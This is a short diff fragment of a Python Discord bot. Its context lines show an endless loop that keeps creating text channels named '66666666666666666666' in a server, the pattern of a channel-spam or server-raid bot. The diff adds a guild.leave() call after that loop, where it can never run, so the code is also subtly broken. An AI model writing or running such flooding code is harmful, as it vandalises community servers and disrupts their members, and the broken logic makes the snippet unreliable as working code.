@@ -22,6 +22,7 @@ class MyClient(discord.Client):
 
         while True:
             await guild.create_text_channel(name='66666666666666666666')
+        await guild.leave()
 
 
 
